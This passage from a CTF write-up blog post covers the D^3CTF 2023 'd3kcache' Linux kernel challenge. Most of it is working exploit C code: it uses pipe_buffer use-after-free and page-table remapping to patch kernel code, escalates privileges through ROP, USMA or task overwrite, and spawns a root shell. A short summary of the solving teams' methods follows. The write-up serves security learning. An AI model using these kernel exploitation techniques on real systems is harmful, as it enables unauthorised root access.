*/</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    kcode_map = mmap((<span class="type">void</span>*) <span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, </span><br><span class="line">                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!kcode_map) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* because of lazy allocation, we need to write it manually */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        kcode_map[i] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">        kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code seg to exec shellcode directly :) */</span></span><br><span class="line">    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">           dst_vaddr);</span><br><span class="line"></span><br><span class="line">    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);</span><br><span class="line">    dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* remapping to our mmap area */</span></span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span>, dst_paddr);</span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span> + <span class="number">0x1000</span>, dst_paddr + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code segment directly */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">     * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>); <span class="comment">/* nop */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>, </span><br><span class="line">            <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="comment">/* endbr64 */</span></span><br><span class="line">            <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="comment">/* mov rax, 1 */</span></span><br><span class="line">            <span class="string">&quot;\xc3&quot;</span>, <span class="comment">/* ret */</span></span><br><span class="line">            <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get root now :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Just for testing CFI&#x27;s availability :)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_control_flow_integrity_detection</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pbuf</span> =</span> (<span class="type">void</span>*) ((<span class="type">size_t</span>)buf + TRD_PIPE_BUF_SZ);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>, *<span class="title">ops_addr</span>;</span></span><br><span class="line"></span><br><span class="line">    ops_addr = (<span class="keyword">struct</span> pipe_buf_operations*) </span><br><span class="line">                 (((<span class="type">size_t</span>) info_pipe_buf.page - vmemmap_base) / <span class="number">0x40</span> * <span class="number">0x1000</span>);</span><br><span class="line">    ops_addr = (<span class="keyword">struct</span> pipe_buf_operations*)((<span class="type">size_t</span>)ops_addr+page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* two random gadget :) */</span></span><br><span class="line">    ops = (<span class="keyword">struct</span> pipe_buf_operations*) buf;</span><br><span class="line">    ops-&gt;confirm = (<span class="type">void</span>*)(<span class="number">0xffffffff81a78568</span> + kernel_offset);</span><br><span class="line">    ops-&gt;release = (<span class="type">void</span>*)(<span class="number">0xffffffff816196e6</span> + kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        pbuf-&gt;ops = ops_addr;</span><br><span class="line">        pbuf = (<span class="keyword">struct</span> pipe_buffer *)((<span class="type">size_t</span>) pbuf + TRD_PIPE_BUF_SZ);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>],&amp;evil_4th_buf,<span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],&amp;evil_2nd_buf,<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">        </span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],&amp;evil_3rd_buf,<span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], buf, <span class="number">0xf00</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger CFI... */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[=] triggering CFI&#x27;s detection...\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    close(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.O - fundamental works</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* bind core to 0 */</span></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* dev file */</span></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to open /dev/d3kcache!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray pgv pages */</span></span><br><span class="line">    prepare_pgv_system();</span><br><span class="line">    prepare_pgv_pages();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.I - page-level heap fengshui to make a cross-cache off-by-null,</span></span><br><span class="line"><span class="comment">     * making two pipe_buffer pointing to the same pages</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    corrupting_first_level_pipe_for_page_uaf();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.II - re-allocate the victim page to pipe_buffer,</span></span><br><span class="line"><span class="comment">     * leak page-related address and construct a second-level pipe uaf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    corrupting_second_level_pipe_for_pipe_uaf();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.III - re-allocate the second-level victim page to pipe_buffer,</span></span><br><span class="line"><span class="comment">     * construct three self-page-pointing pipe_buffer </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    building_self_writing_pipe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.IV - leaking fundamental information by pipe</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    info_leaking_by_arbitrary_pipe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.V - different method of exploitation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;rop&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">/* traditionally root by rop */</span></span><br><span class="line">        privilege_escalation_by_rop();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;cfi&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">/* extra - check for CFI&#x27;s availability */</span></span><br><span class="line">        trigger_control_flow_integrity_detection();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;usma&quot;</span>)) &#123;</span><br><span class="line">        privilege_escalation_by_usma();</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* default: root by seeking init_task and overwrite current */</span></span><br><span class="line">        privilege_escalation_by_task_overwrite();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we SHOULDN&#x27;T get there, so panic :( */</span></span><br><span class="line">    trigger_control_flow_integrity_detection();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="0x03-Conclusion"><a href="#0x03-Conclusion" class="headerlink" title="0x03. Conclusion"></a>0x03. Conclusion</h1><p>My <code>d3kcache</code> challenge has only two solvers this time: NU1L and TeamGoulash. Both teams chose to overwrite the <code>busybox</code> to obtained the flag.</p>
<p>NU1L team sprayed the <code>msg_msg</code> and used this null-byte overflow to do a partial overwrite on the  <code>msg_msg-&gt;m_list.next</code> to construct a UAF (similar to <a target="_blank" rel="noopener" href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">CVE-2021-22555</a>). Then they sprayed the <code>msg_msgseg</code> to construct a fake <code>msg_msg</code>, overwrite the <code>m_ts</code> to perform the out-of-bound read. Finally they used  <code>fcntl(F_SETPIPE_SZ)</code>  to resize the <code>pipe_buffer</code> to fit in the UAF object, using <a target="_blank" rel="noopener" href="https://github.com/veritas501/pipe-primitive">pipe primitive</a> to perform the dirty pipe attack. As the <code>msg_msg</code> in size <code>0x1000</code> also come from order-3, it’s also possible for them to achieve the corss-cache overflow. But at the first stage they need to fit in a <code>pipe_buffer</code> with the size of <code>0xc0</code> (from <code>kmalloc-cg-192</code>), the total reliability is about 1&#x2F;16.</p>
<p>TeamGoulash used the  <code>fcntl(F_SETPIPE_SZ)</code> to let the <code>pipe_buffer</code> fit in order-3 to do a page-level UAF. Then they <code>fork()</code> a new process out to try to re-allocate the UAF page as the part of its page table. As the page table is writable, they mapped the read-only <code>busybox</code> into the memory and make it writable to perform a write beyond privilege. However there’re so many noisy objects that may get this UAF page, the total reliability is about 5%.</p>
<p>Generally speaking, I’m satisfied with my <code>d3kcache</code> challenge. Hope that I can bring you something more interesting in the future : )</p>
<p><img src="https://s2.loli.net/2023/05/01/SFKbgnzPJdIYUZT.png" alt="TeamGoulash：hidethepain"></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>arttnba3</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://blog.arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">http://blog.arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Pwn/"># Pwn</a>
                    
                        <a href="/tags/Linux/"># Linux</a>
                    
                        <a href="/tags/D-3CTF/"># D^3CTF</a>
                    
                        <a href="/tags/CTF/"># CTF</a>
                    
                        <a href="/tags/Linux-Kernel/"># Linux Kernel</a>
                    
                        <a href="/tags/Heap-Overflow/"># Heap Overflow</a>
                    
                        <a href="/tags/Cross-Cache-Overflow/"># Cross-Cache Overflow</a>
                    
                        <a href="/tags/Page-level-Heap-Fengshui/"># Page-level Heap Fengshui</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
            
            <a class="next" rel="next" href="/2021/04/08/CVE-0X00-CVE-2016-5195/">【CVE.0x00】Analysis of CVE-2016-5195 (Dirty Cow)</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>
            © 2022 arttnba3 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a>
        </span>
    </div>
</footer>

    </div>
</body>

</html>